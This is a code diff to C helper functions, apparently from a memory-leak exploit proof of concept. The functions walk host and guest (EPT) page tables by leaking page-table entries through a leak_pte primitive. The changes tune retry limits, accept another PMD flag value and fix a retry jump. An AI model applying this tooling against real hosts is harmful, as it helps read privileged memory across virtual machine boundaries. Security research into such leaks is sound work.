@@ -132,7 +132,7 @@ pte_t leak_pte(hpa_t base, hpa_t pa)
 
 hpa_t translate(hpa_t base, hva_t va, hpa_t cr3, hva_t hdm)
 {
-	#define RETRY_THRES 3
+	#define RETRY_THRES 2
 	const int verbose = 1;
 	if (verbose >= 2) fprintf(stderr, "\ttranslate(base=%lx, va=%lx, cr3=%lx, hdm=%lx)\n", base, va, cr3, hdm);
 
@@ -144,7 +144,7 @@ hpa_t translate(hpa_t base, hva_t va, hpa_t cr3, hva_t hdm)
 	u64 tries_pgd = 0, tries_pud = 0, tries_pmd = 0, tries_pte = 0;
 	hpa_t pgd_pa;
 retry_pgd:
-	if (tries_pgd >= RETRY_THRES) {
+	if (tries_pgd >= RETRY_THRES+2) {
 		if (verbose >= 2) { fprintf(stderr, "translate:"); dump(tries_pgd); }
 		return -1;
 	}
@@ -200,7 +200,7 @@ retry_pmd:
 	pte_t pmd = leak_pte(base, pmd_pa);
 	if (verbose >= 2) dumpp(pmd);
 	if (verbose == 1) { fprintf(stderr, "pmd %10lx ", pmd); fflush(stdout); }
-	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x907) || ((pmd & 0xfff) == 0xff7) || ((pmd & 0xfff) == 0xbf7) || ((pmd & 0xfff) == 0xbf3) || ((pmd & 0xfff) == 0x8f3) || ((pmd & 0xfff) == 0x9f3) || ((pmd & 0xfff) == 0x0e3))) {
+	if (!(((pmd & 0xfff) == 0x067) || ((pmd & 0xfff) == 0x907) || ((pmd & 0xfff) == 0xff7) || ((pmd & 0xfff) == 0xbf7) || ((pmd & 0xfff) == 0xbf3) || ((pmd & 0xfff) == 0x8f3) || ((pmd & 0xfff) == 0x9f3) || ((pmd & 0xfff) == 0x0e3) || ((pmd & 0xfff) == 0x9f7))) {
 		if (verbose == 1) fprintf(stderr, "\n\t--> ");
 		goto retry_pmd;
 	}
@@ -212,6 +212,7 @@ retry_pmd:
 	}
 
 	hpa_t l3;
+retry_pte:
 	if (tries_pte >= RETRY_THRES) {
 		if (verbose >= 2) { fprintf(stderr, "translate:"); dump(tries_pte); }
 		tries_pte = 0;
@@ -227,7 +228,7 @@ retry_pmd:
 	if (verbose == 1) { fprintf(stderr, "pte %10lx ", pte); fflush(stdout); }
 	if (!(((pte & 0xfff) == 0x063) || ((pte & 0xfff) == 0x907) || ((pte & 0xfff) == 0x107) || ((pte & 0xfff) == 0x877) || ((pte & 0xfff) == 0xb77))) {
 		if (verbose == 1) fprintf(stderr, "\n\t--> ");
-		goto retry_pmd;
+		goto retry_pte;
 	}
 	hpa_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
 	if (verbose >= 2) dumpp(pa);
@@ -255,7 +256,7 @@ hpa_t translate_tdp(hpa_t base, gva_t va, gva_t gdm, hpa_t gcr3, hpa_t eptp)
 	
 	fprintf(stderr, "translate_tdp(%lx)", va);
 
-	#define RETRY_THRES 3
+	#define RETRY_THRES 1
 	const int verbose = 1;
 	if (verbose >= 2) fprintf(stderr, "translate_tdp(base=%lx, va=%lx, gdm=%lx, gcr3=%lx, eptp=%lx)\n", base, va, gdm, gcr3, eptp);
 	u64 tries_gpgd = 0, tries_gpud = 0, tries_gpmd = 0, tries_gpte = 0;
@@ -393,7 +394,7 @@ hpa_t translate2gpa(hpa_t base, gva_t va, gva_t gdm, hpa_t gcr3, hpa_t eptp)
 	
 	fprintf(stderr, "translate2gpa(%lx)", va);
 
-	#define RETRY_THRES 3
+	#define RETRY_THRES 1
 	const int verbose = 1;
 	if (verbose >= 2) fprintf(stderr, "translate2gpa(base=%lx, va=%lx, gdm=%lx, gcr3=%lx, eptp=%lx)\n", base, va, gdm, gcr3, eptp);
 	u64 tries_gpgd = 0, tries_gpud = 0, tries_gpmd = 0, tries_gpte = 0;
